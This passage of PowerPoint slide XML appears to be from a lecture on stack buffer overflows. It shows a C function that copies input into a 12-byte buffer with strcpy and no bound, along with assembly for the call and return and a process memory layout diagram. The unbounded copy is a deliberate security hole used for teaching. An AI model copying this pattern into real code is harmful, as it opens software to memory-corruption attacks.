                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>void foo (char *bar)</a:t>
            </a:r>
          </a:p>
          <a:p>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   char c[12];</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strcpy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> (c, bar); //no bound</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
                <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
                <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0">
              <a:latin typeface="Segoe UI Semibold" pitchFamily="34" charset="0"/>
              <a:ea typeface="Verdana" pitchFamily="34" charset="0"/>
              <a:cs typeface="Verdana" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="11" name="Group 10"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3192381" y="1532436"/>
            <a:ext cx="3166719" cy="1941680"/>
            <a:chOff x="5942683" y="1906856"/>
            <a:chExt cx="1115262" cy="1941680"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="FAC090"/>
          </a:solidFill>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="8" name="TextBox 7"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5942684" y="2553187"/>
              <a:ext cx="1115261" cy="646331"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:grpFill/>
            <a:ln>
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0"/>
                <a:t>push </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0" err="1"/>
                <a:t>argv</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0"/>
                <a:t>[1]</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" b="1" i="1" dirty="0"/>
                <a:t>call</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" dirty="0"/>
                <a:t> foo	</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" i="1" dirty="0"/>
                <a:t>#EIP will be pushed</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="TextBox 8"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5942684" y="1906856"/>
              <a:ext cx="1115261" cy="646331"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:grpFill/>
            <a:ln>
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0"/>
                <a:t>XXX</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0"/>
                <a:t>YYY          </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" i="1" dirty="0"/>
                <a:t># </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
                <a:t>instrs</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" i="1" dirty="0"/>
                <a:t> for </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
                <a:t>printf</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" i="1" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="10" name="TextBox 9"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5942683" y="3202205"/>
              <a:ext cx="1115262" cy="646331"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:grpFill/>
            <a:ln>
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0"/>
                <a:t>ZZZ</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" dirty="0"/>
                <a:t>KKK		</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" i="1" dirty="0"/>
                <a:t># </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
                <a:t>instrs</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" i="1" dirty="0"/>
                <a:t> for </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" i="1" dirty="0" err="1"/>
                <a:t>printf</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" i="1" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3180055" y="3835019"/>
            <a:ext cx="3166714" cy="2031325"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FAC090"/>
          </a:solidFill>
          <a:ln>
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>push EBP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mov</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ESP, EBP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>sub 12 ESP 	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" i="1" dirty="0"/>
              <a:t>#Allocate buffer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>copy data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mov</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> EBP ESP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>pop EBP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ret</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="4" name="Straight Arrow Connector 3"/>
          <p:cNvCxnSpPr>
            <a:endCxn id="9" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="1995055" y="1855602"/>
            <a:ext cx="1197329" cy="8120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a:endCxn id="8" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="1473620" y="2501933"/>
            <a:ext cx="1718764" cy="44530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endCxn id="10" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="1995055" y="3150951"/>
            <a:ext cx="1197326" cy="3583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3" name="Rectangle 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3106076" y="3510660"/>
            <a:ext cx="560332" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>foo:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="30" name="Group 29"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7193082" y="1855601"/>
            <a:ext cx="1618408" cy="3764600"/>
            <a:chOff x="6921030" y="1585924"/>
            <a:chExt cx="2286000" cy="4188845"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="32" name="Rectangle 8"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6921030" y="2323773"/>
              <a:ext cx="2286000" cy="726525"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="accent6">
                <a:lumMod val="60000"/>
                <a:lumOff val="40000"/>
              </a:schemeClr>
            </a:solidFill>
            <a:ln w="9525">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" charset="0"/>
                  <a:ea typeface="新細明體" charset="0"/>
                  <a:cs typeface="新細明體" charset="0"/>
                </a:rPr>
                <a:t>Text</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="33" name="Rectangle 9"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6921030" y="3050299"/>
              <a:ext cx="2286000" cy="787069"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:schemeClr val="tx2">
                <a:lumMod val="60000"/>
                <a:lumOff val="40000"/>
              </a:schemeClr>
            </a:solidFill>
            <a:ln w="9525">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                  <a:latin typeface="Times New Roman" charset="0"/>
                  <a:ea typeface="新細明體" charset="0"/>
                  <a:cs typeface="新細明體" charset="0"/>
                </a:rPr>
                <a:t>Data</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="34" name="Rectangle 14"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6921030" y="3837368"/>
              <a:ext cx="2286000" cy="193740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Heap</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
              <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
              <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
              <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" charset="0"/>
                <a:ea typeface="新細明體" charset="0"/>
                <a:cs typeface="新細明體" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="accent2"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" charset="0"/>
                  <a:ea typeface="新細明體" charset="0"/>
                  <a:cs typeface="新細明體" charset="0"/>
                </a:rPr>
                <a:t>Stack</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="35" name="Line 15"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="8064030" y="4413492"/>
              <a:ext cx="0" cy="26693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p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="36" name="Line 16"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipV="1">
              <a:off x="8064030" y="4906899"/>
              <a:ext cx="0" cy="25505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p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="37" name="Rectangle 8"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6921030" y="1585924"/>
              <a:ext cx="2286000" cy="72652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kumimoji="1" lang="en-US" altLang="zh-TW" sz="1600" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" charset="0"/>
                  <a:ea typeface="新細明體" charset="0"/>
                  <a:cs typeface="新細明體" charset="0"/>
                </a:rPr>
                <a:t>OS Kernel</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Rectangle 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3037106" y="1195985"/>
            <a:ext cx="715648" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>main:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="25" name="Straight Arrow Connector 24"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6359100" y="2461917"/>
            <a:ext cx="742797" cy="36586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7" name="Straight Arrow Connector 26"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="6359100" y="2947242"/>
            <a:ext cx="742797" cy="191090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493179" y="6122099"/>
            <a:ext cx="1736373" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Source code in C</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="TextBox 38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3617124" y="6141887"/>
            <a:ext cx="2615507" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The executable illustrated </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>using assembly code</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="TextBox 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7227029" y="6081647"/>
            <a:ext cx="1633781" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Memory layout</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Slide Number Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>15</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7568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1"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65" name="Group 64"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7411305" y="5660532"/>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279" y="503280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3" name="Slide Number Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>16</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3632460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0"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65" name="Group 64"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7411305" y="4085979"/>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376153" y="1947804"/>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22"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23"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2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25"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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="Group 2"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7484261" y="2132470"/>
            <a:ext cx="1442424" cy="1821111"/>
            <a:chOff x="7484261" y="2132470"/>
            <a:chExt cx="1442424" cy="1821111"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="26" name="Rectangle 2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27" name="Right Brace 26"/>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14"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5873616" y="2035859"/>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c[0]</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Rectangle 14"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5873616" y="2426741"/>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c[1]</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Rectangle 14"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5873616" y="3690952"/>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c[11]</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>17</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="398953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0"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65" name="Group 64"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7411305" y="4085979"/>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376153" y="1947804"/>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22"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23"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2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25"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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="Group 2"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7484261" y="2132470"/>
            <a:ext cx="1442424" cy="1821111"/>
            <a:chOff x="7484261" y="2132470"/>
            <a:chExt cx="1442424" cy="1821111"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="26" name="Rectangle 2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27" name="Right Brace 26"/>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14"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5873616" y="2035859"/>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‘a’</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Rectangle 14"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5873616" y="2426741"/>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‘b’</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Rectangle 14"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5873616" y="3690952"/>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‘\0’</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5154183" y="1301413"/>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“abcdef87654”</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{4F16CFC1-D6E9-5244-A559-738FECFB22C9}" type="slidenum">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:t>18</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="245509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0"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65" name="Group 64"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7411305" y="4085979"/>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073" y="1947804"/>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22"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23"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2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25"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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="3" name="Group 2"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="7484261" y="2132470"/>
            <a:ext cx="1442424" cy="1821111"/>
            <a:chOff x="7484261" y="2132470"/>
            <a:chExt cx="1442424" cy="1821111"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="26" name="Rectangle 2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27" name="Right Brace 26"/>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14"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5873616" y="2035859"/>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‘a’</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Rectangle 14"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
